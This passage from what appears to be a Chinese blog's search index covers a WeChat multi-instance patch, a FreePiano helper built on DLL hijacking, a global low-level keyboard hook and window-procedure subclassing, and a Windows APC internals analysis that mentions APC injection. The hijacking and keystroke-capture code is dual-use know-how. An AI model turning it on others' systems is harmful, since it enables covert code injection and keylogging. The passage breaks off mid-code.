MAX_PATH*sizeof(WCHAR);if(ERROR_SUCCESS != RegQueryValueEx(hKey, L&quot;InstallPath&quot;, 0, &amp;Type, (LPBYTE)Path, &amp;cbData))&#123; goto __exit;&#125;PathAppend(Path, L&quot;WeChat.exe&quot;);//启动微信客户端ShellExecute(NULL, L&quot;Open&quot;, Path, NULL, NULL, SW_SHOW); 代码就这样，有注释，就不再啰嗦。 完整代码，请看后面的地址。 0x03 总结一个小玩意，供大家一笑。 编译好的可执行文件： https://github.com/anhkgg/multi_wechat_pc/raw/master/WeChat%E5%A4%9A%E5%BC%80.exe 源码地址： https://github.com/anhkgg/multi_wechat_pc 博客原文： https://anhkgg.github.io/wechat-multi-pc 转载请注明出处：https://anhkgg.github.io/wechat-multi-pc","tags":[{"name":"wechat","slug":"wechat","permalink":"https://anhkgg.github.io/tags/wechat/"},{"name":"handle","slug":"handle","permalink":"https://anhkgg.github.io/tags/handle/"},{"name":"patch","slug":"patch","permalink":"https://anhkgg.github.io/tags/patch/"}]},{"title":"让代码飞出一段钢琴曲(freepiano小助手)","date":"2017-05-01T07:11:42.000Z","path":"coding-piano-hook/","text":"概述突然想玩一下键盘弹曲子，就找到了freepiano，专业的东西不懂，就找了写简谱来玩玩，感觉挺不错的，哈哈~~ 玩疯了之后，突然想到，我平时写代码，是不是可以弹出一段曲子呢，是不是心情会变得非常好，代码也写的更有节奏呢~~ 说不定还搞出来一个什么《代码之歌》的钢琴曲~~ 嘎嘎 突然被自己这个想法吸引住了，不管咋样，每敲下代码的一个字符，后面想起了背景音乐，真是不错的，程序员也可以是“钢琴师”啊~~ 有了想法，就开整！！！ 有下面几点问题： freepiano必须是激活窗口下，才能接受键盘输入 我要在写代码时，让freepiano响应按键，就需要全局劫持键盘输入了 怎么给freepiano通知，我按下了什么呢？ 忘了说，freepiano长这样： 开搞先简单整理下思路： 首先肯定是弄个键盘钩子难道全局的所有键盘输入，暂定WH_KEYBOARD 怎么让钩子执行？弄个exe，把freepiano再启动起来，感觉麻烦，然后就想让freepiano加载我的模块吧，简单确认了一下，可行（后面具体描述） 劫持到键盘输入之后，通过PostMessage给freepiano发送键盘消息，模拟WM_KEYDOWN/WM_KEYUP 1. 加载我的模块首先想到的就是DLL劫持和修改freepiano的导入表，后者不够优雅，果断要选择dll劫持。 然后就用depends看了下freepiano的导入信息，发现几个可以劫持的（dsound.dll，d3d9.dll等），简单代码确认了一下，freepiano可以劫持这两个模块，选择了d3d9.dll（函数少）。 然后偷懒用了aheadlib导出了d3d9.dll的导出函数信息，简单方便，飞快得就搞定了劫持。 代码很简单，就贴一点（都不需要手写）：1234567891011121314151617// 导出函数#pragma comment(linker, &quot;/EXPORT:Direct3DShaderValidatorCreate9=_AheadLib_Direct3DShaderValidatorCreate9,@1&quot;)#pragma comment(linker, &quot;/EXPORT:PSGPError=_AheadLib_PSGPError,@2&quot;)#pragma comment(linker, &quot;/EXPORT:PSGPSampleTexture=_AheadLib_PSGPSampleTexture,@3&quot;)...// 导出函数ALCDECL AheadLib_Direct3DShaderValidatorCreate9(void)&#123; // 保存返回地址 __asm POP m_dwReturn[0 * TYPE long]; // 调用原始函数 GetAddress(&quot;Direct3DShaderValidatorCreate9&quot;)(); // 转跳到返回地址 __asm JMP m_dwReturn[0 * TYPE long];&#125; 一试，OK，模块起来了，freepiano正常工作。 ) 2. 安装钩子选择了安装全局WH_KEYBOARD钩子，这个代码网上也太多了，就不细说了，看看就行1234567891011121314151617181920212223242526//安装钩子BOOL Hook(HMODULE hMod)&#123; g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hMod, 0); return g_Hook?TRUE:FALSE;&#125;//卸载钩子VOID Unhook()&#123; if(g_Hook) &#123; UnhookWindowsHookEx(g_Hook); &#125;&#125;//钩子函数，劫持键盘消息LRESULT CALLBACK KeyboardProc( int code, // hook code WPARAM wParam, // virtual-key code LPARAM lParam // keystroke-message information )&#123; if(code == HC_ACTION) &#123; SendKeyMsg(wParam, lParam); &#125; return CallNextHookEx(g_Hook, code, wParam, lParam);&#125; 3. 发送按键信息给freepiano首先想到的就是在钩子函数里给freepiano发送WM_KEYDOWN/WM_KEYUP消息就行了。 先找到freepiano的窗口，spy++上，找到窗口标题和类型信息，然后代码：123456789HWND hwnd = FindWindow(&quot;FreePianoMainWindow&quot;, &quot;Wispow Freepiano 2&quot;);if(hwnd == NULL)&#123; hwnd = FindWindow(&quot;FreePianoMainWindow&quot;, NULL); if(hwnd == NULL) &#123; hwnd = FindWindow(NULL, &quot;Wispow Freepiano 2&quot;); &#125;&#125; 然后就是发消息：12345678910111213if(hwnd)&#123; SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE); if(keydown) &#123; keydown = false; PostMessage(hwnd, WM_KEYDOWN, wParam, lParam); &#125;else &#123; keydown = true; PostMessage(hwnd, WM_KEYUP, wParam, lParam); &#125;&#125; 测试，失败了，没有预想的效果。 分析原因： Post发送消息失败。但是通过spy++抓消息看到freepiano是收到了消息的。那就不是这个原因。 freepiano校验了窗口是否激活？然后就用上面每次置顶试了一下，依然不行。 freepiano使用了GetKeyState之类的函数检查按键状态，通过ida简单看了一下导入表，没有相关函数（没有深究是否显示导入了）。 用ida看了下freepiano的窗口消息处理，看是否有什么过滤 123456789v7.lpfnWndProc = (WNDPROC)xxx_main_wndproc_41D070; //窗口响应函数v7.cbClsExtra = 0;v7.cbWndExtra = 0;v7.hInstance = GetModuleHandleA(0);v7.hIcon = LoadIconA(v1, (LPCSTR)0xA);v7.hCursor = 0;v7.hbrBackground = 0;v7.lpszMenuName = 0;v7.lpszClassName = &quot;FreePianoMainWindow&quot;; 然后发现居然没有对WM_KEYDOWN/WM_KEYUP/WM_CHAR之类的消息进行处理，那是怎么接受的按键信息 继续用ida看是否有钩子之类的处理，果然，导入表中明晃晃的SetWindowsHookEx，进入一看，一个WM_KEYBOARD_LL局部钩子 进钩子函数一下，各种按键状态记录的处理，不深究了。基本确认他使用这种方式来接受按键信息。 12345678910111213v6 = (unsigned __int8)byte_4F6DC8[scanCode]; if ( (unsigned int)(v6 - 1) &gt; 0x6A ) goto LABEL_23; if ( (unsigned __int8)byte_4F6ED0[v6] != pressed_0 ) &#123; byte_4F6ED0[v6] = pressed_0; sub_449B20(v6, pressed_0 != 0); &#125; if ( (_BYTE)dword_4F6DC0 || BYTE1(dword_4F6DC0) &amp;&amp; (v6 == &apos;D&apos; || v6 == &apos;H&apos;) || BYTE2(dword_4F6DC0) &amp;&amp; (byte_4F6F15 || byte_4F6F17) &amp;&amp; v6 == 28 ) result = 1; else 4. 改变策略那就不能直接PostMessage发送消息了。 修改我的钩子为WM_KEYBOARD_LL全局键盘钩子，消息和freepiano完全一样了 1g_Hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hMod, 0); 钩子函数通过WM_COPYDATA打包数据，发送给freepiano 1234567891011121314151617181920212223242526272829LRESULT CALLBACK LowLevelKeyboardProc( int nCode, // hook code WPARAM wParam, // message identifier LPARAM lParam // message data )&#123; COPYDATASTRUCT CopyData = &#123;0&#125;; KeyboardLL_Msg Msg = &#123;0&#125;; Msg.nCode = nCode; Msg.wParam = wParam; memcpy(&amp;Msg.lParam, (char*)lParam, sizeof(KBDLLHOOKSTRUCT)); CopyData.cbData = sizeof(KeyboardLL_Msg); CopyData.dwData = 0; CopyData.lpData = &amp;Msg; HWND hwnd = FindFreepiano(); if(hwnd) &#123; BOOL ret = SendMessage(hwnd, WM_COPYDATA, (WPARAM)hwnd, (LPARAM)&amp;CopyData); &#125; return CallNextHookEx(g_Hook, nCode, wParam, lParam);&#125;typedef struct _KeyboardLL_Msg&#123; int nCode; WPARAM wParam; KBDLLHOOKSTRUCT lParam;&#125;KeyboardLL_Msg, *PKeyboardLL_Msg; 通过SetWindowLong挂钩freepiano的窗口响应函数，增加处理WM_COPYDATA，来接受全局键盘信息，找到freepiano的钩子函数地址A，然后接受到WM_COPYDATA之后，直接调用A，把键盘信息给freepiano 通过一个线程，循环查找freepianp窗口（可能还没起来），然后hook窗口响应函数1234567891011121314151617void HookWinProc()&#123; while(1) &#123; HWND hwnd = FindFreepiano(); if(hwnd) &#123; g_WndProc = (pfn_WindProc)GetWindowLong(hwnd, GWL_WNDPROC); if(g_WndProc) &#123; SetWindowLong(hwnd, GWL_WNDPROC, (LONG)fakeWindowProc); break; &#125; &#125; Sleep(10); &#125;&#125; 自己的函数中加入对WM_COPYDATA的消息处理，调用freepiano的钩子函数g_LowLevelKeyboardProc发键盘消息过去。 1234567891011121314151617181920LRESULT WINAPI fakeWindowProc( HWND hWnd, // handle to window UINT Msg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; if(Msg == WM_COPYDATA) &#123; COPYDATASTRUCT* CopyData = (COPYDATASTRUCT*)lParam; //if(CopyData-&gt;cbData == sizeof(KeyboardLL_Msg)) &#123; KeyboardLL_Msg* Msg = (KeyboardLL_Msg*)CopyData-&gt;lpData; g_LowLevelKeyboardProc(Msg-&gt;nCode, Msg-&gt;wParam, (LPARAM)&amp;Msg-&gt;lParam); &#125; &#125; return g_WndProc(hWnd, Msg, wParam, lParam);&#125; g_LowLevelKeyboardProc地址这里使用硬编码，图方便12HMODULE hExe = GetModuleHandle(NULL);g_LowLevelKeyboardProc = (pfn_LowLevelKeyboardProc)((DWORD)hExe + (DWORD)g_LowLevelKeyboardProc); 功能到这里基本搞定。 总结测试通过。 手指立马不受控制的在编辑器里、浏览器、文件浏览器里各种按键，然后耳边响起了悠扬（忽略乱打的节奏的话）的钢琴声~~ 可能的优化： 加入进程名单控制，不想在某些进程中听到琴声 代码优化~~ 有兴趣的同学可以去折腾，我这里就不继续了~~ 转载请注明出处：http://anhkgg.github.io/coding-piano-hook","tags":[{"name":"WM_KEYBOARD_LL","slug":"WM-KEYBOARD-LL","permalink":"https://anhkgg.github.io/tags/WM-KEYBOARD-LL/"},{"name":"HOOK","slug":"HOOK","permalink":"https://anhkgg.github.io/tags/HOOK/"},{"name":"freepiano","slug":"freepiano","permalink":"https://anhkgg.github.io/tags/freepiano/"},{"name":"inject","slug":"inject","permalink":"https://anhkgg.github.io/tags/inject/"}]},{"title":"小Win，点一份APC（Apc机制详解）（一）","date":"2017-04-28T10:20:47.000Z","path":"win-apc-analyze1/","text":"翻开翻开小Win的菜单，APC赫然在目… 做工讲究，味道不错，是小Win的热门菜，我们点一来尝尝！ 吃了可以做很多事情… APC注入 APC注入 APC注入 … 细节来自于ReactOS源码分析。 如果对这个发神经的文风有任何不适，请谅解，因为我确实神经了 来一份APCring3这么做的点APC的正确姿势是使用QueueUserApc，不走寻常路的也可以使用NtQueueApcThread 1234567891011DWORD WINAPI QueueUserApc(PARCFUNC pfnApc, HANDLE hThread, ULONG_PTR dwData);&#123; NtQueueApcThread(hThread, IntCallUserApc, pfnApc, dwData, NULL); &#125;NTSTATUS NTAPI NtQueueApcThread(IN HANDLE ThreadHandle, IN PKNORMAL_ROUTINUE ApcRoutine, IN PVOID NormalContext, //pfnApc IN PVOID SystemArgument1, //dwData IN PVOID SystemArgument2 ); 也就是QueueUserApc内部是NtQueueApcThread做的，两者区别不大，当然，使用后者可以字节加点调料（不使用IntCallUserApc、换成自己的函数，函数参数也可以有三个了，而PARCFUNC只有一个参数）。 小Win默认是通过统一的接口IntCallUserApc来调用的顾客指定的Apc函数。 12345static void CALLBACK IntCallUserApc(PVOID Function, PVOID dwData, PVOID Arg3)&#123; ((PAPCFUNC)Function)(dwData);&#125; ring0这么做的NtQueueApcThread经过系统调用进入到ring0，一般人是看不到了…，我也是一般人来着，下面努力变成二班的…。 1. 创建APC对象进了NtQueueApcThread，先通过KeInitializeApc初始化一个Apc对象12345678910/* Initialize the APC */KeInitializeApc(Apc, &amp;Thread-&gt;Tcb, //KTHREAD OriginalApcEnvironment, PspQueueApcSpecialApc, NULL, ApcRoutine, UserMode, NormalContext); APC对象结构定义如下：123456789101112131415161718typedef struct _KAPC &#123; UCHAR Type; //类型ApcObject UCHAR SpareByte0; UCHAR Size; //APC结构体大小 UCHAR SpareByte1; ULONG SpareLong0; struct _KTHREAD *Thread; //当前线程的KTHREAD LIST_ENTRY ApcListEntry; //当前线程的APC链表 PKKERNEL_ROUTINE KernelRoutine; // PKRUNDOWN_ROUTINE RundownRoutine; // PKNORMAL_ROUTINE NormalRoutine; // PVOID NormalContext; //用户定义的Apc函数 PVOID SystemArgument1; //用户Apc函数的参数 PVOID SystemArgument2;// CCHAR ApcStateIndex; //Apc状态 KPROCESSOR_MODE ApcMode; //Apc所处的Mode，UserMode/KernelMode BOOLEAN Inserted; //是否已经被插入队列&#125; KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC; 根据KeInitializeApc传入参数，Apc被赋值如下： 12345678910111213141516171819Apc-&gt;KernelRoutine = PspQueueApcSpecialApc;Apc-&gt;RundownRoutine = NULL;Apc-&gt;NormalRoutine = ApcRoutine;//如果使用QueueUserApc，其实就是IntCallUserApcApc-&gt;NormalContext = NormalContext;//pfnApc;//用户指定的Apc函数Apc-&gt;Type = ApcObject;//如果参数指定的是CurrentApcEnvironment，直接赋值Thread-&gt;ApcStateIndexApc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex;//不是则Apc-&gt;ApcStateIndex = OriginalApcEnvironment;////如果参数ApcRoutine不是NULLApc-&gt;ApcMode = Mode;Apc-&gt;NormalContext = Context;//是NULLApc-&gt;ApcMode = KernelMode;Apc-&gt;NormalContext = NULL;Apc-&gt;Inserted = False; 其中关于ApcStateIndex有4中值，如下：123456789// APC Environment Types//typedef enum _KAPC_ENVIRONMENT&#123; OriginalApcEnvironment,//0 AttachedApcEnvironment,//1 CurrentApcEnvironment,//2 InsertApcEnvironment&#125; KAPC_ENVIRONMENT; Apc-&gt;KernelRoutine总是有值的，被赋值为PspQueueApcSpecialApc，用于Apc结束时候释放Apc对象内存1234567891011VOIDNTAPIPspQueueApcSpecialApc(IN PKAPC Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2)&#123; /* Free the APC and do nothing else */ ExFreePool(Apc);&#125; 2. 插入APC队列通过KeInsertQueueApc插入队列，在队列中等待被上菜… 1234KeInsertQueueApc(Apc, SystemArgument1, SystemArgument2, IO_NO_INCREMENT)) 确认Apc未被插入，Thread-&gt;ApcQueueable为真 Apc-&gt;Inserted = True 然后通过KiInsertQueueApc插入队列，可能通过软中断或者唤醒线程得到执行Apc的机会 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263VOIDFASTCALLKiInsertQueueApc(IN PKAPC Apc, IN KPRIORITY PriorityBoost)&#123; if (Apc-&gt;ApcStateIndex == InsertApcEnvironment) &#123; Apc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex; &#125; //PKAPC_STATE ApcStatePointer[2];//说明ApcStateIndex只能是 //OriginalApcEnvironment,//0 //AttachedApcEnvironment,//1 //从Thread的ApcStatePointer取出对应的ApcState ApcState = Thread-&gt;ApcStatePointer[(UCHAR)Apc-&gt;ApcStateIndex]; ApcMode = Apc-&gt;ApcMode; ASSERT(Apc-&gt;Inserted == TRUE); /* 插入队列的三种方式: * 1) Kernel APC with Normal Routine or User APC = Put it at the end of the List * 2) User APC which is PsExitSpecialApc = Put it at the front of the List * 3) Kernel APC without Normal Routine = Put it at the end of the No-Normal Routine Kernel APC list */ //PsExitSpecialApc if (Thread-&gt;ApcStateIndex == Apc-&gt;ApcStateIndex) &#123; if(当前线程 ) &#123; if(KernelMode) &#123; Thread-&gt;ApcState.KernelApcPending = TRUE; if (!Thread-&gt;SpecialApcDisable) &#123; //中断线程当前执行六？？ /* They&apos;re not, so request the interrupt */ HalRequestSoftwareInterrupt(APC_LEVEL); &#125; &#125; &#125; else &#123; if(KernelMode) &#123; Thread-&gt;ApcState.KernelApcPending = TRUE; if (Thread-&gt;State == Running) HalRequestSoftwareInterrupt(APC_LEVEL); else if(一堆条件)&#123; KiUnwaitThread(Thread, Status, PriorityBoost);//唤醒线程 &#125; &#125; else &#123; if ((Thread-&gt;State == Waiting) &amp;&amp; (Thread-&gt;WaitMode == UserMode) &amp;&amp; ((Thread-&gt;Alertable) || // (Thread-&gt;ApcState.UserApcPending))) &#123; /* Set user-mode APC pending */ Thread-&gt;ApcState.UserApcPending = TRUE; Status = STATUS_USER_APC; KiUnwaitThread(Thread, Status, PriorityBoost);//唤醒线程 &#125; &#125; &#125; &#125;&#125; 先不管Apc是怎么得到执行的，来看看KAPC_STATE 12345678typedef struct _KAPC_STATE&#123; LIST_ENTRY ApcListHead[2];//UserMode/KernelMode的两个链表 struct _KPROCESS *Process; BOOLEAN KernelApcInProgress; BOOLEAN KernelApcPending; //等待执行 BOOLEAN UserApcPending; //等待执行&#125; KAPC_STATE, *PKAPC_STATE, *RESTRICTED_POINTER PRKAPC_STATE; 其中ApcListHead保存了线程的两个Apc链表，分别对应UserMode和KernelMode。 Thread-&gt;ApcState表示当前需要执行的ApcState，可能是挂靠进程的 Thread-&gt;SavedApcState表示挂靠后保存的当前线程的ApcState， KTHREAD的ApcStatePointer[2]字段保存了两个ApcState的指针 具体看下面的代码 12345678910111213141516171819202122232425262728KeAttachProcess-&gt;VOIDNTAPIKiAttachProcess(IN PKTHREAD Thread, IN PKPROCESS Process, IN PKLOCK_QUEUE_HANDLE ApcLock, IN PRKAPC_STATE SavedApcState //&amp;Thread-&gt;SavedApcThread )&#123;/* Swap the APC Environment */ KiMoveApcState(&amp;Thread-&gt;ApcState, SavedApcState); //把当前ApcState保存到SavedApcState /* Reinitialize Apc State */ InitializeListHead(&amp;Thread-&gt;ApcState.ApcListHead[KernelMode]); InitializeListHead(&amp;Thread-&gt;ApcState.ApcListHead[UserMode]); Thread-&gt;ApcState.Process = Process; Thread-&gt;ApcState.KernelApcInProgress = FALSE; Thread-&gt;ApcState.KernelApcPending = FALSE; Thread-&gt;ApcState.UserApcPending = FALSE; /* Update Environment Pointers if needed*/ if (SavedApcState == &amp;Thread-&gt;SavedApcState) &#123; Thread-&gt;ApcStatePointer[OriginalApcEnvironment] = &amp;Thread-&gt; SavedApcState;// Thread-&gt;ApcStatePointer[AttachedApcEnvironment] = &amp;Thread-&gt;ApcState; Thread-&gt;ApcStateIndex = AttachedApcEnvironment; //index变成了AttachedApcEnvironment &#125; 来一个结构图 上菜吃饭Apc已经点了，什么时候才能端上来呢？我们接着看… Apc投递 线程wait、线程切换到应用层、线程被挂起等，一旦线程有空隙了，windows就会把apc队列顺便执行一遍 搜索NormalRoutine和KernelRoutine字段，找到KiDeliverApc，这个函数是具体分发Apc的函数 12345678910VOIDNTAPIKiDeliverApc(IN KPROCESSOR_MODE DeliveryMode, IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame) * @remarks First, Special APCs are delivered, followed by Kernel-Mode APCs and * User-Mode APCs. Note that the TrapFrame is only valid if the * delivery mode is User-Mode. * Upon entry, this routine executes at APC_LEVEL. 那在哪里调用的KiDeliverApc的呢，找到多处 123456789101112131415161718192021//hal\\halx86\\generic\\irq.S.globl _HalpApcInterrupt2ndEntry.func HalpApcInterrupt2ndEntry]//hal\\halx86\\generic\\irql.cVOID HalpLowerIrql(KIRQL NewIrql)；//暂时忽略上面两个了//ke\\i386\\trap.s.func KiServiceExit_KiServiceExit: /* Disable interrupts */ cli /* Check for, and deliver, User-Mode APCs if needed */ CHECK_FOR_APC_DELIVER 1 // /* Exit and cleanup */ TRAP_EPILOG FromSystemCall, DoRestorePreviousMode, DoNotRestoreSegments, DoNotRestoreVolatiles, DoRestoreEverything.endfunc 根据《windows内核情景分析》介绍, 执行用户APC的时机在从内核返回用户空间的途中（可能是系统调用、中断、异常处理之后需要返回用户空间） 也就是肯定会经过_KiServiceExit，那就跟着来看看吧。 CHECK_FOR_APC_DELIVER宏 检查是不是需要投递Apc，具体检查trapframe是不是指向返回用户模式的，是则继续检查用户模式Apc是否需要投递。参数：ebp = PKTRAP_FRAME，PreserveEax trap_frame.Eflags == EFLAGS_V86_MASK，运行在V86模式，不检查是否是用户模式的trap_frame trap_frame.Segcs != 1（KernelMode），表示是用户模式 kthread = PCR[KPCR_CURRENT_THREAD]，kthread.alerted = 0，置为不可唤醒 kthread-&gt;ApcState.UserApcPending 是FALSE，啥也不做，TRUE才进行投递 如果PreserveEax=1，保存eax，保存一些IRQL提升会清除的信息到trap_frame，fs，ds，es，gs 提示irql到APC_LEVEL 调用KiDeliverApc(UserMode, 0, trap_frame); 恢复irql 如果PreserveEax=1，恢复eax TRAP_EPILOG是自陷处理，参数：ebp = PKTRAP_FRAME // This macro creates an epilogue for leaving any system trap.// It is used for exiting system calls, exceptions, interrupts and generic// traps. 通过TrapFrame恢复一堆寄存器、堆栈信息，然后sysexit回到用户态空间 继续看一下调用KiDeliverApc内部究竟是怎么处理的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495KiDeliverApc(IN KPROCESSOR_MODE DeliveryMode, IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame) //系统空间堆栈的“自陷框架”&#123;//1. 保存原来的trap_frameOldTrapFrame = Thread-&gt;TrapFrame;Thread-&gt;TrapFrame = TrapFrame;/* Clear Kernel APC Pending */Thread-&gt;ApcState.KernelApcPending = FALSE;/* Check if Special APCs are disabled */if (Thread-&gt;SpecialApcDisable) goto Quickie;//2. 先投递内核Apc，循环投递队列中所有的内核apc，不涉及切换到用户空间while (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[KernelMode]))&#123; //Thread-&gt;ApcQueueLock加锁访问 //取出一个Apc ApcListEntry = Thread-&gt;ApcState.ApcListHead[KernelMode].Flink; Apc = CONTAINING_RECORD(ApcListEntry, KAPC, ApcListEntry); NormalRoutine = Apc-&gt;NormalRoutine; KernelRoutine = Apc-&gt;KernelRoutine; NormalContext = Apc-&gt;NormalContext; SystemArgument1 = Apc-&gt;SystemArgument1; SystemArgument2 = Apc-&gt;SystemArgument2; //特殊Apc，特指内核Apc，但是Apc的NormalRoutine是空的 if (!NormalRoutine) &#123; //将Apc出队列，然通过KernelRoutine调用内核Apc响应函数 KernelRoutine(Apc, &amp;NormalRoutine, &amp;NormalContext, &amp;SystemArgument1, &amp;SystemArgument2); &#125; else &#123; //普通的内核Apc if ((Thread-&gt;ApcState.KernelApcInProgress) || (Thread-&gt;KernelApcDisable)) &#123; //退出，必须安全才会投递 &#125; ////将Apc出队列，然通过KernelRoutine调用内核Apc响应函数 KernelRoutine(Apc, &amp;NormalRoutine, //内部可能修改NormalRoutine &amp;NormalContext, &amp;SystemArgument1, &amp;SystemArgument2); //如果NormalRoutine依然不为空，在调用NormalRoutine if (NormalRoutine) &#123; /* At Passive Level, an APC can be prempted by a Special APC */ Thread-&gt;ApcState.KernelApcInProgress = TRUE; KeLowerIrql(PASSIVE_LEVEL); //将到PASSIVE_LEVEL执行 /* Call and Raise IRQ back to APC_LEVEL */ NormalRoutine(NormalContext, SystemArgument1, SystemArgument2); KeRaiseIrql(APC_LEVEL, &amp;ApcLock.OldIrql); &#125; Thread-&gt;ApcState.KernelApcInProgress = FALSE; //继续循环 &#125;&#125;//3. 投递完内核apc，如果KiDeliverApc目标是用户apc，那么继续投递用户apc//每次值投递一个User mode Apcif ((DeliveryMode == UserMode) &amp;&amp; !(IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode])) &amp;&amp; (Thread-&gt;ApcState.UserApcPending)) //TRUE &#123; Thread-&gt;ApcState.UserApcPending = FALSE; //取出第一个Apc //先调用他的KernelRoutine KernelRoutine(Apc, &amp;NormalRoutine, &amp;NormalContext, &amp;SystemArgument1, &amp;SystemArgument2); /* Check if there&apos;s no normal routine */ if (!NormalRoutine) &#123; /* Check if more User APCs are Pending */ KeTestAlertThread(UserMode); &#125; else &#123; /* Set up the Trap Frame and prepare for Execution in NTDLL.DLL */ //不是直接调用NormalRoutine，因为他是用户太的函数，需要切换到用户空间才能执行 KiInitializeUserApc(ExceptionFrame, TrapFrame, NormalRoutine, NormalContext, SystemArgument1, SystemArgument2); &#125; &#125; 根据注释应该很清楚deliver的逻辑了，还是在看张图 CHECK_FOR_APC_DELIVER用户态Apc的delvier有个重点，Thread-&gt;ApcState.UserApcPending必须是TRUE，那什么时候才会是TRUE，我蛮来看看 在KiInsertQueueApc，如果线程等待，且Alertable是TRUE123456789101112else if ((Thread-&gt;State == Waiting) &amp;&amp; (Thread-&gt;WaitMode == UserMode) &amp;&amp; ((Thread-&gt;Alertable) || // (Thread-&gt;ApcState.UserApcPending))) &#123; /* Set user-mode APC pending */ Thread-&gt;ApcState.UserApcPending = TRUE; Status = STATUS_USER_APC; goto Unwait; &#125;``` 2. KiCheckAlertability中(wrk中是TestForAlertPending) FORCEINLINENTSTATUSKiCheckAlertability(IN PKTHREAD Thread, IN BOOLEAN Alertable, IN KPROCESSOR_MODE WaitMode){ / Check if the wait is alertable / if (Alertable) { / It is, first check if the thread is alerted in this mode / if (Thread-&gt;Alerted[WaitMode]) { / It is, so bail out of the wait / Thread-&gt;Alerted[WaitMode] = FALSE; return STATUS_ALERTED; } else if ((WaitMode != KernelMode) &amp;&amp; (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode]))) { / It’s isn’t, but this is a user wait with queued user APCs / Thread-&gt;ApcState.UserApcPending = TRUE; return STATUS_USER_APC;123456两种情况都需要Alertable = TRUE，这个字段表示线程是唤醒的，也就是说只有可唤醒的线程，才能拿投递他的用态APC，否则不会&gt; SleepEx, WaitForSingleObject，WaitForMultipleObjects都可以设置线程为Alertable接着继续看看`KiInitializeUserApc`是怎么切换到用户空间执行的用户态函数 VOIDNTAPIKiInitializeUserApc(IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame, IN PKNORMAL_ROUTINE NormalRoutine, IN PVOID NormalContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2){ //V86模式下，不投递 /* Save the full context */ Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; KeTrapFrameToContext(TrapFrame, ExceptionFrame, &amp;Context); //检查不是KernleMode ASSERT((TrapFrame-&gt;SegCs &amp; MODE_MASK) != KernelMode); ... /* Get the aligned size */ AlignedEsp = Context.Esp &amp; ~3;//来自于TrapFrame.HardwareEsp或TempEsp //Context和4个参数的长度 ContextLength = CONTEXT_ALIGNED_SIZE + (4 * sizeof(ULONG_PTR)); //将原始堆栈扩展ContextLength，用来保存Context和参数 Stack = ((AlignedEsp - 8) &amp; ~3) - ContextLength; /* Probe the stack */ ProbeForWrite((PVOID)Stack, AlignedEsp - Stack, 1); ASSERT(!(Stack &amp; 3)); /* Copy data into it */ //(4 * sizeof(ULONG_PTR)))是后面4个参数的位置，然后接着拷贝Context，将老的TrapFrame内容拷贝到用户太堆栈中 RtlCopyMemory((PVOID)(Stack + (4 * sizeof(ULONG_PTR))), &amp;Context, sizeof(CONTEXT)); /* Run at APC dispatcher */ TrapFrame-&gt;Eip = (ULONG)KeUserApcDispatcher; //KeUserApcDispatcher保存的其实就是KiUserApcDispatcher，是用户空间函数 TrapFrame-&gt;HardwareEsp = Stack;//栈顶 /* Setup Ring 3 state */ TrapFrame-&gt;SegCs = Ke386SanitizeSeg(KGDT_R3_CODE, UserMode); TrapFrame-&gt;HardwareSegSs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode); TrapFrame-&gt;SegDs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode); TrapFrame-&gt;SegEs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode); TrapFrame-&gt;SegFs = Ke386SanitizeSeg(KGDT_R3_TEB, UserMode); TrapFrame-&gt;SegGs = 0; TrapFrame-&gt;ErrCode = 0; /* Sanitize EFLAGS */ TrapFrame-&gt;EFlags = Ke386SanitizeFlags(Context.EFlags, UserMode); /* Check if thread has IOPL and force it enabled if so */ if (KeGetCurrentThread()-&gt;Iopl) TrapFrame-&gt;EFlags |= 0x3000; /* Setup the stack */ *(PULONG_PTR)(Stack + 0 * sizeof(ULONG_PTR)) = (ULONG_PTR)NormalRoutine; *(PULONG_PTR)(Stack + 1 * sizeof(ULONG_PTR)) = (ULONG_PTR)NormalContext; *(PULONG_PTR)(Stack + 2 * sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument1; *(PULONG_PTR)(Stack + 3 * sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument2; ... }1234567执行流程根据注释应该很清楚了，这里要解释一下TrapFrame。&gt; CPU进入啮合之后，内核堆栈就会有个TrapFrame，保存的是用户空间的线程（因进入内核原因不同，可能是自陷、中断、异常框架，都是一样的结构）。CPU返回用户空间时会使用这个TrapFrame，才能正确返回原理啊的断点，并回复寄存器的状态&gt; 这里为了让Apc返回到用户空间执行，就会修改这个TrapFrame，原来的TrapFrame就需要保存，这里保存在了用户空间堆栈中（CONTEXT)&gt; 执行完Apc函数之后，执行一个NtContinue，将这个CONTEXT作为参数，这样保存的TrapFrame就会还原到原来的状态，然后CPU又能正常回之前的用户空间了。KiDeliverApc完了之后，回到_KiServiceExit，会使用被修改过的TrapFrame回到用户空间，执行指定的`KiUserApcDispatcher`(ntdll提供) //更具这个执行KiUserApcDispatcherTrapFrame-&gt;Eip = (ULONG)KeUserApcDispatcher; //其实就是KiUserApcDispatcher，是用户空间函数TrapFrame-&gt;HardwareEsp = Stack;//栈顶 .func KiUserApcDispatcher@16.globl _KiUserApcDispatcher@16_KiUserApcDispatcher@16: /* Setup SEH stack */ lea 